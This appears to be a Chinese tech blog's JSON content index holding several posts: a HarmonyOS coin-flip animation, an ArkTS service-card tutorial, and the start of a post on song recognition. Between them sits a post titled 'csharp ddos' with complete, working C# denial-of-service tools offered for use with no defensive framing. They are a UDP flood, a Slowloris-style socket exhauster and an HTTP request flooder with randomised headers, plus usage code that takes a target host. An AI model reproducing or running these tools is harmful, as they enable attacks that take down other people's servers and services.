第一次动画，向上抛出 animateToImmediately(&#123; duration: totalAnimationDuration / 2, // 动画时长为总时长的一半 onFinish: () =&gt; &#123; // 动画完成后的回调 // 第二次动画，向下落 animateToImmediately(&#123; duration: totalAnimationDuration / 2, onFinish: () =&gt; &#123; this.rotationAngle = this.rotationAngle % 360; // 确保角度在0到360之间 // 判断当前显示的面 if (this.isHeadsFaceUp()) &#123; // 如果是地鼠面 this.tailsCount++; // 反面朝上的次数加1 &#125; else &#123; // 如果是反面 this.headsCount++; // 正面朝上的次数加1 &#125; this.isAnimRun = false &#125; &#125;, () =&gt; &#123; this.verticalOffset = 0; // 重置纵向位移 &#125;); &#125; &#125;, () =&gt; &#123; // 设置纵向位移，模拟抛硬币的效果 this.verticalOffset = -100 * (1 + Math.floor(Math.random() * 5)); // 随机设置向上的位移 &#125;); // 循环动画，增加旋转效果 for (let i = 0; i &lt; maxAnimationSteps; i++) &#123; animateToImmediately(&#123; delay: i * totalAnimationDuration / maxAnimationSteps, // 设置每次动画的延迟 duration: 100, // 每次动画的持续时间 onFinish: () =&gt; &#123; // 动画完成后的回调 &#125; &#125;, () =&gt; &#123; this.rotationAngle += 90; // 每次增加90度旋转 &#125;); &#125; &#125;); &#125;.width(&#x27;100%&#x27;).layoutWeight(1).align(Alignment.Bottom).padding(&#123; bottom: 80 &#125;); // 设置组件的宽度、权重、对齐方式和底部内边距 &#125; .height(&#x27;100%&#x27;) // 设置整个页面的高度 .width(&#x27;100%&#x27;) // 设置整个页面的宽度 .backgroundColor(&quot;#0b0d0c&quot;); // 设置背景颜色 &#125; // 判断当前是否显示地鼠面 isHeadsFaceUp() &#123; let normalizedAngle = this.rotationAngle % 360; // 规范化角度 // 判断角度范围，确定是否显示地鼠面 if (normalizedAngle &gt;= 0 &amp;&amp; normalizedAngle &lt; 90 || normalizedAngle &gt;= 270 &amp;&amp; normalizedAngle &lt;= 360) &#123; return true; // 显示地鼠面 &#125; return false; // 显示反面 &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonryOS","slug":"HarmonryOS","permalink":"https://banjinmei.github.io/tags/HarmonryOS/"}],"author":"mu"},{"title":"鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片","slug":"鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片","date":"2024-12-13T14:45:30.000Z","updated":"2024-12-13T16:18:19.445Z","comments":true,"path":"2024/12/13/鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片/","permalink":"https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/","excerpt":"","text":"鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片服务卡片架构卡片使用方 提供方 ArkTS卡片创建创建步骤 卡片相关文件（卡片生命周期管理文件 卡片页面文件 卡片配置文件） ArkTS生命周期ArkTS卡片事件开发router message call 服务卡片的定义及基本概念卡片定义作为一种界面展示形式，可将重要信息或操作前置到卡片，以达到服务直达、减少体验层级的目的。卡片常用于嵌入其他系统应用中，作为其页面展示的一部分，支持拉起页面、发送消息等基础交互功能。 基本概念卡片提供方包含卡片的应用，提供卡片的显示内容可以进行交互如界面刷新、应用跳转等。卡片使用方如图中的桌面，控制卡片的展示位置。 攻克难点1、在DevEco studio中如何创建服务卡片?2、服务卡片开发涉及哪些重要的配置文件?3、如何使用router事件跳转到指定UIAbility，实现服务直达效果?4、如何实现卡片内容的定点和定时刷新? 实战创建卡片项目内左侧 entry右键 new service widget ets&#x2F;entryformabilityEntryFormAbility.ts 生命周期文件ets&#x2F;widget&#x2F;pages&#x2F;WidgetCard.ets 卡片页面 form_config.json 卡片配置 “isDefault”: true, &#x2F;&#x2F;默认拉起的卡片 “updateEnabled”: false, &#x2F;&#x2F;表示卡片是否支持周期性刷新 “scheduledUpdateTime”: “10:30”,&#x2F;&#x2F;表示卡片的定点剧新时刻，采用24小时制，精确到分钟 “updateDuration”: 1, &#x2F;&#x2F;表示卡片定时剧新的更新周期，单位为30分钟，两种方式任选其一，同时配置，定时刷新优先生效 main_pages.json 路由 运行卡片创建完成后，可以点击DevEcoStudio开发工具右上角的启动按钮，运行项目查看效果易错点:鼠标按住左键向上心拖动，换出服务卡片。 在EntryFormAbility.ts文件中实现了FormExtensionAbility的生命周期接口，开发者可根据自身业务需求，调用对应的接口。8大生命周期export default class EntryFormAbility extends FormExtensionAbility {onAddForm(want) {..)} 创建卡片时触发 ★ 信息传递onCastToNormalForm(formld) {…} 临时卡片转常态卡片时触发**onUpdateForm(formid) **{..} 卡片更新时触发 ★onChangeFormVisibility(newStatus) {…} 修改卡片可见性时触发onFormEvent(formld, message) {…} 处理卡片事件时触发 ★onRemoveForm(formld){…} 卡片销毁时触发nConfigurationUpdate(config) {…} 系统配置更新时触发onAcquireFormState(want){…} 查询卡片状态时触发 卡片事件开发ArKTS卡片提供了**postCardAction()**接口，用于卡片内部和提供方应用间的交互，当前支持router、message和call三种类型的事件，仅在卡片中可以调用。 卡片页面文件(WidegetCard.ets)postCardAction-&gt; message -&gt;触发onFormEvent-&gt; FormExtensionAbility(EntryFormAbility.ts) 卡片页面文件(WidegetCard.ets)postCardAction-&gt;router-&gt;首次启动触发onCreate非首次启动触发onNewWantUlAbility(EntryAbility.ts)-&gt;call-&gt;首次启动触发onCreateUlAbility(EntryAbility.ts) 卡片事件-router使用router事件跳转到指定UIAbility。&gt;在卡片页面文件中调用router事件能够快速拉起卡片提供方应用的指定UIAbility，实现一键直达的效果。在UlAbility的EntryAbility.ts文件中接收router事件并获取参数，根据传递的params不同，选择拉起不同的页面。 ##卡片事件-message刷新卡片 (点击 )在EntryFormAbility.ts文件中的onFormEvent生命周期中调用updateForm接口刷新卡片。 卡片事件-数据交互有时在刷新卡片内容时，我们希望实现定时刷新或者定点刷新，无需手动刷新。定时刷新:表示在一定时间间隔内调用onUpdateForm的生命周期回调函数自动刷新卡片内容。可以在form config.json配置文件的updateDuration字段中进行设置。定点刷新:表示每天在某个时间点刷新，在form config.json文件的scheduledUpdateTime字段进行设置。(自动) 在触发定时或定点刷新后，系统会调用ntryFormAbility.ts文件中的生命周期回调onUpdateForm，在回调中可以使用updateForm进行提供方刷新卡片。 使用声明式范式开发ArkTS卡片页面，在WallPaperCard.ets文件（即卡片的页面文件）中完成卡片的UI界面构建 使用router事件跳转到指定UIAbility当我们点击卡片时，希望跳转到应用的主页面，仔细分析，该功能可拆分为以下两个部分实现： 首先，在WallPaperCard.ets卡片页面中调用postCardAction向指定EntryAbility发送router事件，并在事件内定义需要传递的内容。 其次，在EntryAbility中接收router事件并获取参数，根据传递的params不同，选择拉起不同的页面。在WallPaperCard.ets卡片页面中调用postCardAction接口向EntryAbility发送router事件，从而拉起EntryAbility；此时，只需在WallPaperCard.ets的页面布局中设定一个点击事件，当用户点击卡片时，即可跳转至应用的详情页面，这里给最外层的根容器组件Row绑定一个点击事件，在其中完成调用postCardAction接口向EntryAbility发送router事件的操作 12345678910//WallPaperCard.ets .onClick(() =&gt; &#123; //使用router,拉起EntryAbility并跳转到对应的详情页面 postCardAction(this, &#123; &quot;action&quot;: this.ACTION_TYPE, &quot;abilityName&quot;: this.ABILITY_NAME, &quot;params&quot;: &#123; &#x27;targetPage&#x27;: &#x27;home&#x27; // 在EntryAbility中处理这个信息 &#125; &#125;); &#125;) 在WallPaperCard.ets卡片页面中向EntryAbility发送router事件后，需要在EntryAbility.ts文件中接收router事件，并获取事件中携带的参数，通过传递的参数选择拉起不同的页面，这里是拉起主页面 123456789101112131415161718192021//EntryAbility.ts onCreate(want, launchParam) &#123; // 如果UIAbility第一次启动，在收到卡片的Router事件后会触发onCreate生命周期回调 // 获取router事件中传递的targetPage参数 if (want.parameters.params !== undefined) &#123; let params = JSON.parse(want.parameters.params); selectPage = params.targetPage; &#125; &#125; // 如果UIAbility是非首次启动，在收到卡片Router事件后会触发onNewWant生命周期回调 onNewWant(want, launchParam) &#123; if (want.parameters.params !== undefined) &#123; // 同样,获取router事件中传递的targetPage参数 let params = JSON.parse(want.parameters.params); selectPage = params.targetPage; &#125; if (currentWindowStage != null) &#123; this.onWindowStageCreate(currentWindowStage); &#125; &#125; 使用message 事件刷新卡片内容在卡片的使用过程中，我们希望可以通过点击卡片中的刷新按钮，实现卡片内容的更新，此时可以在WallPaperCard.ets中调用postCardAction接口触发message事件拉起FormExtensionAbility，然后由FormExtensionAbility刷新卡片内容。仔细分析，上述效果可拆分为以下两个部分实现： 首先，在卡片页面中给Button组件绑定点击事件，在其中调用postCardAction接口触发message事件拉起FormExtensionAbility。 其次，在EntryFormAbility.ts的onFormEvent生命周期中调用updateForm接口刷新卡片。在WallPaperCard.ets卡片页面中给Button组件绑定点击事件，在其中调用postCardAction接口触发message事件拉起FormExtensionAbility 12345678.onClick(() =&gt; &#123; //点击刷新按钮,通过message事件刷新卡片数据 postCardAction(this, &#123; &#x27;action&#x27;: this.ACTION_TYPE2, &#x27;params&#x27;: &#123; &#x27;msgTest&#x27;: &#x27;messageEvent&#x27; &#125; &#125;); &#125;) 在EntryFormAbility.ts的onFormEvent生命周期中调用updateForm接口刷新卡片 12345678910111213onFormEvent(formId, message) &#123; // 通过messages事件刷新,就会触发该回调 let formData = &#123; &#x27;recommend&#x27;: &#x27;message刷新&#x27;, //要刷新的具体内容，和卡片布局中对应 &#125;; let formInfo = formBindingData.createFormBindingData(formData) //调用updateForm接口刷新卡片 formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;)&#125; 卡片数据交互卡片的定时刷新在卡片的使用过程中，有时候我们希望卡片的内容可以定时自动刷新,比如每隔0.5小时刷新一次；定时刷新的功能效果，同样可拆分为以下两个部分实现： 首先，需要在“resources&gt;base&gt;profile”目录下的form_config.json配置文件中对updateDuration字段进行设置。 其次，在触发定时刷新后，系统会调用EntryFormAbility.ts中的onUpdateForm生命周期回调，在回调中，可以使用updateForm进行提供方刷新卡片。定时刷新的时间间隔单位为30分钟，因此每隔0.5小时刷新，则updateDuration字段值应该设为1，同时将updateEnabled字段值设为true EntryFormAbility.ts中的onUpdateForm生命周期回调具体代码如下所示： 12345678910111213onUpdateForm(formId) &#123; //设置定时或定点更新后,系统就会触发该回调 let formData = &#123; &#x27;recommend2&#x27;: &#x27;定时刷新&#x27;, //要刷新的具体内容，和卡片布局中对应 &#125;; let formInfo = formBindingData.createFormBindingData(formData) // 调用updateForm接口刷新卡片 formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;) &#125; 卡片的定点刷新在卡片的使用过程中，有时候我们希望卡片的内容可以定点自动刷新，比如每天上午的10:30就自动刷新卡片内容，定点刷新的功能效果，同样可拆分为以下两个部分实现： 首先，需要在“resources&gt;base&gt;profile”目录下的form_config.json配置文件中对scheduledUpdateTime字段进行设置。 其次，在触发定点刷新后，系统会调用EntryFormAbility.ts中的onUpdateForm生命周期回调，在回调中，可以使用updateForm进行提供方刷新卡片。需要注意的是，定时刷新与定点刷新之间存在优先级问题，updateDuration（定时刷新）优先级比scheduledUpdateTime（定点刷新）高，配置定时刷新后，定点刷新将失效。如果同时配置了updateDuration（定时刷新）和scheduledUpdateTime（定点刷新），想要定点刷新生效，则需要将updateDuration配置为0。此处如想实现每天10:30定点刷新卡片内容，则须在配置文件中将updateDuration配置为0，同时scheduledUpdateTime设置为10:30，将updateEnabled字段值设为true 同样地，定点刷新触发后，系统会自动调用EntryFormAbility.ts中的onUpdateForm生命周期回调，onUpdateForm具体代码如下所示： 1234567891011121314onUpdateForm(formId) &#123; //设置定时或定点更新后,系统就会触发该回调 let formData = &#123; //&#x27;recommend2&#x27;: &#x27;定时刷新&#x27; &#x27;recommend3&#x27;: &#x27;定点刷新&#x27;, //要刷新的具体内容，和卡片布局中对应 &#125;; let formInfo = formBindingData.createFormBindingData(formData) // 调用updateForm接口刷新卡片 formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;) &#125; tips:如果在过程中发现定点刷新始终无法生效，请先排查模拟器中的时间是否和真实的标准时间一致，如果不一致，可直接在模拟器设置中完成时间校准，例如定点刷新时间为10:30，则在设置中将时间调整为10：29（因为项目重启需要时间编译），重启项目工程~","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"ArkTS","slug":"ArkTS","permalink":"https://banjinmei.github.io/tags/ArkTS/"}],"author":"mu"},{"title":"csharp ddos","slug":"csharp-ddos","date":"2024-12-11T13:19:04.000Z","updated":"2024-12-11T14:10:59.439Z","comments":true,"path":"2024/12/11/csharp-ddos/","permalink":"https://banjinmei.github.io/2024/12/11/csharp-ddos/","excerpt":"","text":"UDP 包发123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using System;using System.Net;using System.Net.Sockets;using System.Text;using System.Threading;class Program&#123; static void Main(string[] args) &#123; Console.Clear(); Console.WriteLine(&quot;UDP Flood Attack&quot;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(&quot;IP Target : &quot;); string ip = Console.ReadLine(); Console.Write(&quot;Port : &quot;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(&quot;Attack Starting&quot;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) &#123; try &#123; udpClient.Send(bytes, bytes.Length, ip, port); sent++; Console.WriteLine($&quot;Sent &#123;sent&#125; packets to &#123;ip&#125; through port: &#123;port&#125;&quot;); // 增加端口号 port++; if (port &gt; 65534) &#123; port = 1; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error: &#123;ex.Message&#125;&quot;); break; &#125; &#125; &#125; static void ShowProgressBar() &#123; int[] delays = &#123; 5, 5, 5, 5 &#125;; string[] progress = &#123; &quot;[ ] 0% &quot;, &quot;[===== ] 25%&quot;, &quot;[========== ] 50%&quot;, &quot;[=============== ] 75%&quot;, &quot;[====================] 100%&quot; &#125;; for (int i = 0; i &lt; progress.Length; i++) &#123; Console.WriteLine(progress[i]); if (i &lt; delays.Length) &#123; Thread.Sleep(delays[i] * 1000); // 模拟延迟 &#125; &#125; &#125;&#125; UDP 数据包发送： 使用 C# 的 UdpClient 类发送 UDP 数据包。数据包内容为随机字节，通过 Random.NextBytes() 填充。进度条显示： 模拟了攻击启动的加载进度，类似原始 Python 代码中的进度条。 端口递增逻辑：每次发送数据包后，端口号加 1。超过 65534 时，重置为 1。 参考：https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py TCP工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172namespace ConsoleApp1Test&#123; /// &lt;summary&gt; /// dstools /// &lt;/summary&gt; internal class ds &#123; public static List&lt;string&gt; AddBots() &#123; List&lt;string&gt; bots = new List&lt;string&gt;(); bots.Add(&quot;http://www.bing.com/search?q=%40&amp;count=50&amp;first=0&quot;); bots.Add(&quot;http://www.google.com/search?hl=en&amp;num=100&amp;q=intext%3A%40&amp;ie=utf-8&quot;); return bots; &#125; public static List&lt;string&gt; AddUserAgent() &#123; List&lt;string&gt; uagents = new List&lt;string&gt;(); try &#123; string[] lines = [&quot;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&quot;, &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&quot;, &quot;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0&quot;]; //System.IO.File.ReadAllLines(&quot;ua.txt&quot;); uagents.AddRange(lines); &#125; catch (FileNotFoundException) &#123; Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine(&quot;[-] No file named &#x27;ua.txt&#x27;,failed to load User-Agents&quot;); Console.ResetColor(); &#125; return uagents; &#125; public static IPAddress CheckTgt(string tgt) &#123; try &#123; IPHostEntry hostEntry = Dns.GetHostEntry(tgt); return hostEntry.AddressList[0]; &#125; catch (Exception) &#123; Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($&quot;[-] Can&#x27;t resolve host:Unknown host!&quot;); Console.ResetColor(); Environment.Exit(1); &#125; return null; &#125; public static string FakeIP() &#123; Random random = new Random(); string[] ips = new string[4]; for (int i = 0; i &lt; 4; i++) &#123; int num = random.Next(0, 256); if (num == 127) &#123; i--; continue; &#125; ips[i] = num.ToString(); &#125; return string.Join(&quot;.&quot;, ips); &#125; &#125;&#125; 网络数据类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157namespace ConsoleApp1Test&#123; public class Pyslow &#123; private string tgt; private int port; private float to; private int threads; private int sleep; private string[] method = &#123; &quot;GET&quot;, &quot;POST&quot; &#125;; private int pkt_count; public Pyslow(string tgt, int port, float to, int threads, int sleep) &#123; this.tgt = tgt; this.port = port; this.to = to; this.threads = threads; this.sleep = sleep; &#125; public byte[] MyPkt() &#123; Random random = new Random(); string text = method[random.Next(0, method.Length)] + &quot; /&quot; + random.Next(1, 999999999).ToString() + &quot; HTTP/1.1\\r\\n&quot; + &quot;Host:&quot; + tgt + &quot;\\r\\n&quot; + &quot;User-Agent:&quot; +ds. AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)] + &quot;\\r\\n&quot; + &quot;Content-Length: 42\\r\\n&quot;; return Encoding.ASCII.GetBytes(text); &#125; public Socket BuildingSocket() &#123; Socket sock = null; try &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) &#123; sock.Send(MyPkt()); pkt_count += 1; &#125; &#125; catch (Exception) &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); pkt_count += 3; if (sock.Connected) &#123; sock.Send(MyPkt()); pkt_count += 1; &#125; &#125; return sock; &#125; public void SendingPackets() &#123; Socket sock = null; try &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) &#123; byte[] data = Encoding.ASCII.GetBytes(&quot;X-a: b\\r\\n&quot;); sock.Send(data); pkt_count += 1; &#125; &#125; catch (Exception) &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); if (sock.Connected) &#123; byte[] data = Encoding.ASCII.GetBytes(&quot;X-a: b\\r\\n&quot;); sock.Send(data); pkt_count += 1; &#125; &#125; &#125; public void DoConnection() &#123; int socks = 0; int fail = 0; List&lt;Socket&gt; lsocks = new List&lt;Socket&gt;(); Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(&quot;\\t\\tBuilding sockets&quot;); Console.ResetColor(); while (socks &lt; threads) &#123; try &#123; Socket sock = BuildingSocket(); if (sock != null) &#123; lsocks.Add(sock); socks++; if (socks &gt; threads) &#123; break; &#125; &#125; &#125; catch (Exception) &#123; fail++; &#125; &#125; Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(&quot;\\t\\tSending packets&quot;); Console.ResetColor(); while (socks &lt; threads) &#123; try &#123; SendingPackets(); socks++; if (socks &gt; threads) &#123; break; &#125; &#125; catch (Exception) &#123; fail++; &#125; &#125; Console.ForegroundColor = ConsoleColor.Green; Console.Write(&quot;I have sent &quot;); Console.ForegroundColor = ConsoleColor.Cyan; Console.Write(pkt_count.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.Write(&quot; packets successfully.Now i&#x27;m going to sleep for &quot;); Console.ForegroundColor = ConsoleColor.Red; Console.Write(sleep.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine(&quot; second&quot;); Thread.Sleep(sleep * 1000); &#125; &#125;&#125; http类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public class Requester&#123; private string tgt; private int port; private bool ssl; private List&lt;HttpWebRequest&gt; req = new List&lt;HttpWebRequest&gt;(); public Requester(string tgt) &#123; this.tgt = tgt; Uri url = new Uri(tgt); if (url.Scheme == &quot;https&quot;) &#123; ssl = true; port = 443; &#125; else &#123; ssl = false; port = 80; &#125; &#125; public Dictionary&lt;string, string&gt; Header2() &#123; Random random = new Random(); List&lt;string&gt; cachetype = new List&lt;string&gt; &#123; &quot;no-cache&quot;, &quot;no-store&quot;, &quot;max-age=&quot; + random.Next(0, 10).ToString(), &quot;max-stale=&quot; + random.Next(0, 100).ToString(), &quot;min-fresh=&quot; + random.Next(0, 10).ToString(), &quot;notransform&quot;, &quot;only-if-cache&quot; &#125;; List&lt;string&gt; acceptEc = new List&lt;string&gt; &#123; &quot;compress,gzip&quot;, &quot;&quot;, &quot;*&quot;, &quot;compress;q=0,5, gzip;q=1.0&quot;, &quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot; &#125;; List&lt;string&gt; acceptC = new List&lt;string&gt; &#123; &quot;ISO-8859-1&quot;, &quot;utf-8&quot;, &quot;Windows-1251&quot;, &quot;ISO-8859-2&quot;, &quot;ISO-8859-15&quot; &#125;; List&lt;string&gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; Dictionary&lt;string, string&gt; http_header = new Dictionary&lt;string, string&gt;(); http_header.Add(&quot;User-Agent&quot;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(&quot;Cache-Control&quot;, c); http_header.Add(&quot;Accept-Encoding&quot;, a); http_header.Add(&quot;Keep-Alive&quot;, &quot;42&quot;); http_header.Add(&quot;Host&quot;, tgt); http_header.Add(&quot;Referer&quot;, bot[random.Next(0, bot.Count)]); return http_header; &#125; public WebHeaderCollection Header() &#123; Random random = new Random(); List&lt;string&gt; cachetype = new List&lt;string&gt; &#123; &quot;no-cache&quot;, &quot;no-store&quot;, &quot;max-age=&quot; + random.Next(0, 10).ToString(), &quot;max-stale=&quot; + random.Next(0, 100).ToString(), &quot;min-fresh=&quot; + random.Next(0, 10).ToString(), &quot;notransform&quot;, &quot;only-if-cache&quot; &#125;; List&lt;string&gt; acceptEc = new List&lt;string&gt; &#123; &quot;compress,gzip&quot;, &quot;&quot;, &quot;*&quot;, &quot;compress;q=0,5, gzip;q=1.0&quot;, &quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot; &#125;; List&lt;string&gt; acceptC = new List&lt;string&gt; &#123; &quot;ISO-8859-1&quot;, &quot;utf-8&quot;, &quot;Windows-1251&quot;, &quot;ISO-8859-2&quot;, &quot;ISO-8859-15&quot; &#125;; List&lt;string&gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; WebHeaderCollection http_header = new WebHeaderCollection(); http_header.Add(&quot;User-Agent&quot;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(&quot;Cache-Control&quot;, c); http_header.Add(&quot;Accept-Encoding&quot;, a); http_header.Add(&quot;Keep-Alive&quot;, &quot;42&quot;); http_header.Add(&quot;Host&quot;, tgt); http_header.Add(&quot;Referer&quot;, bot[random.Next(0, bot.Count)]); return http_header; &#125; public string RandStr() &#123; Random random = new Random(); List&lt;string&gt; mystr = new List&lt;string&gt;(); for (int x = 0; x &lt; 3; x++) &#123; const string chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;; string text = new string(Enumerable.Repeat(chars, random.Next(7, 14)).Select(s =&gt; s[random.Next(s.Length)]).ToArray()); mystr.Add(text); &#125; return string.Join(&quot;&amp;&quot;, mystr); &#125; public string CreateUrl() &#123; return tgt + &quot;?&quot; + RandStr(); &#125; public void Run(string method,int count=1) &#123; try &#123; foreach (var _ in Enumerable.Range(0, count)) // 可以根据实际需求调整循环次数等逻辑，这里简单示例先循环1次 &#123; //string method = new string[] &#123; &quot;GET&quot;, &quot;POST&quot; &#125;[new Random().Next(0, 2)]; // 先创建包含完整请求URL（包含参数等）的Uri对象 Uri requestUri = new Uri(CreateUrl()); HttpWebRequest reqter; if (ssl) &#123; reqter = (HttpWebRequest)WebRequest.Create(requestUri); &#125; else &#123; reqter = (HttpWebRequest)WebRequest.Create(requestUri); &#125; reqter.Method = method; using (WebResponse response = reqter.GetResponse()) &#123; // 可以在这里添加对响应内容的处理逻辑，当前为空 Console.WriteLine(response.ContentLength.ToString()); &#125; &#125; &#125; catch (Exception e) &#123; Console.WriteLine(e.Message); &#125; &#125; &#125; 使用12345678910111213141516171819202122232425262728293031 string target = &quot;xxx&quot;;// 替换为实际目标IP或域名 int port = xxx; float timeout = 5.0f; int threads = 10; int sleepTime = 100; Pyslow pyslow = new Pyslow(target, port, timeout, threads, sleepTime); try &#123; pyslow.DoConnection(); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;发生异常: &#123;ex.Message&#125;&quot;); &#125;//// 创建Requester类的实例，传入目标URL//Requester requester = new Requester(&quot;http://xxx/index.html&quot;); // http://xxx:16552//try//&#123;// // 调用Run方法来执行发送请求等相关操作// requester.Run(&quot;GET&quot;, 100);//POST//&#125;//catch (Exception ex)//&#123;// Console.WriteLine($&quot;发生异常: &#123;ex.Message&#125;&quot;);//&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"}],"author":"mu"},{"title":"听歌识曲","slug":"听歌识曲","date":"2024-12-10T14:33:56.000Z","updated":"2024-12-13T17:50:26.588Z","comments":true,"path":"2024/12/10/听歌识曲/","permalink":"https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/","excerpt":"","text":"听歌识曲抖音小视频背景音乐识别 前言现代语言系中语音的特征是指描述语音的核心信息，这在语音模型的构建中起重要作用。人类通过耳朵听到的特有的频率组成的序列来记忆歌曲，针对于短视频中的背景音乐，通过傅里叶变换将声音转换为频率，得到一个个数组，再由数组组合成声音指纹，从而进行音乐的识别。 1.背景歌名识别产生背景解决方案-语音处理技术语音信号处理(Speech Signal Processing)简称语音处理，是用以研究语音发声过程、语音信号统计特性、语音自动识别、机器合成以及语音感知等各种处理技术的总称。由于现代的语音处理技术都以数字计算为基础，并借助微处理器、信号处理器或通用计算机加以实现，因此也称数字语音信号处理。 2.语音处理技术概述什么是语音处理语音信号处理的研究起源于对发音器官的模拟。1939年美国H.杜德莱(H.Dudley)展出了一个简单的发音过程模拟系统，以后发展为声道的数字模型。利用该模型可以对语音信号进行各种频谱及参数的分析，进行通信编码或数据压缩的研究，同时也可基于此合成语音信号，实现机器的语音合成。语言信息主要包含在语音信号的参数之中，因此准确而迅速地提取语言信号的参数是进行语音信号处理的关键。 语音处理-声纹识别声纹(Voiceprint)，也可称作说话人识别，是一种通过声音判别说话人身份的技术，声纹是携带言语信息的声波频谱，由波长、频率以及强度等多种特征维度组成的生物特征，有稳定性，可测量性以及唯一性等优点。不同的人说话所产生的声纹图谱是存在差异的，通过对比差异就可实现声纹识别的功能。 声纹识别特征共鸣方式特征咽腔共鸣、鼻腔共鸣和口腔共鸣 